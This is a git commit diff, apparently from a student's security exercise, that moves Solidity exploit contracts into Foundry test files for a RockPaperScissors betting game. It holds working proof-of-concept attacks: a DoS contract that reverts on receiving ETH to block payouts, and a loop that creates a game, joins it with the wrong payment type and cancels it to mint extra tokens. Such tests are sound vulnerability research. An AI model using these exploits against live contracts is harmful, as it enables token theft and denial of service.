bb97363063541a6d1787553d9c5811d282460806
Luu-Duc-Toan <23120095@student.hcmus.edu.vn>
2025-10-17 09:12:50 +0700

    Reorganize

--- test/DoS.t.sol
+++ test/DoS.t.sol
@@ -3,7 +3,6 @@ pragma solidity ^0.8.13;
 
 import "../src/WinningToken.sol";
 import "../src/RockPaperScissors.sol";
-import "../src/DoS.sol";
 import "forge-std/Test.sol";
 
 contract JoiningWrongGameTypeTest is Test {
@@ -59,5 +58,33 @@ contract JoiningWrongGameTypeTest is Test {
         vm.prank(playerA);
         vm.expectRevert();
         game.timeoutReveal(gameId);
+    }
+}
+
+contract DoS {
+    bool public denied;
+
+    constructor(RockPaperScissors _game, uint256 _gameId) payable {
+        _game.joinGameWithEth{value: msg.value}(_gameId);
+    }
+
+    function setDenied(bool _denied) external {
+        denied = _denied;
+    }
+
+    function forward(
+        bytes calldata _data
+    ) external payable returns (bytes memory) {
+        (bool success, bytes memory result) = msg.sender.call{value: msg.value}(
+            _data
+        );
+        require(success, "Forward failed");
+        return result;
+    }
+
+    receive() external payable {
+        if (denied) {
+            revert();
+        }
     }
 }
--- test/JoinningWrongGameType.t.sol
+++ test/JoinningWrongGameType.t.sol
@@ -3,7 +3,6 @@ pragma solidity ^0.8.13;
 
 import "../src/WinningToken.sol";
 import "../src/RockPaperScissors.sol";
-import "../src/JoiningWrongGameType.sol";
 import "forge-std/Test.sol";
 
 contract JoiningWrongGameTypeTest is Test {
@@ -27,11 +26,57 @@ contract JoiningWrongGameTypeTest is Test {
     function test_joiningWrongGameType() public {
         vm.startPrank(attacker);
 
-        JoiningWrongGameType exploitContract = new JoiningWrongGameType(game, token);
+        JoiningWrongGameType exploitContract = new JoiningWrongGameType(
+            game,
+            token
+        );
         token.transfer(address(exploitContract), 1);
         exploitContract.attack(times);
         assertEq(token.balanceOf(attacker), attackerInitialRPSW + times);
 
         vm.stopPrank();
+    }
+}
+
+contract Helper {
+    RockPaperScissors immutable game;
+    WinningToken immutable token;
+
+    constructor(RockPaperScissors _game, WinningToken _token) {
+        game = _game;
+        token = _token;
+    }
+
+    function joinGame(uint256 gameId) external {
+        game.joinGameWithEth(gameId);
+    }
+
+    function withdraw(uint256 amount, address to) external {
+        token.transfer(to, amount);
+    }
+}
+
+contract JoiningWrongGameType {
+    RockPaperScissors immutable game;
+    WinningToken immutable token;
+    Helper helper;
+
+    constructor(RockPaperScissors _game, WinningToken _token) {
+        game = _game;
+        token = _token;
+        helper = new Helper(_game, _token);
+    }
+
+    function attack(uint256 times) external {
+        require(token.balanceOf(address(this)) >= 1, "Insufficient tokens");
+
+        for (uint256 i = 0; i < times; i++) {
+            token.approve(address(game), 1);
+            uint256 gameId = game.createGameWithToken(1, 5 minutes);
+            helper.joinGame(gameId);
+            game.cancelGame(gameId);
+        }
+        token.transfer(msg.sender, 1);
+        helper.withdraw(times, msg.sender);
     }
 }
